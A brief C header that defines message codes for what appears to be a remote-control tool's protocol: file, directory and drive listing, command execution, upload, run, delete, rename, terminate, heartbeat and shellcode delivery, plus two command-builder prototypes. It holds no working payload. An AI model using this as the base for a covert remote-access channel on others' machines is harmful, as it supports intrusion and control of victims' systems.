#pragma once

#include "packet.h"

#define MISSION_TYPE_FILE		1
#define MISSION_TYPE_DIR		2
#define MISSION_TYPE_DRIVE		3
#define MISSION_TYPE_CMD		4
#define MISSION_TYPE_UPLOAD		5

#define MISSION_TYPE_RUN		9

#define MISSION_TYPE_DELFILE	10
#define MISSION_TYPE_RENFILE	11

#define COMMAND_TYPE_TERMINATE	6
#define COMMAND_TYPE_SHELLCODE	7
#define COMMAND_TYPE_HEARTBEAT	8

char* buildCmd(CONST char* data, int datalen, int type);

char* buildCmd2(CONST char* data1, int datalen1, int type, const char* data2, int datalen2);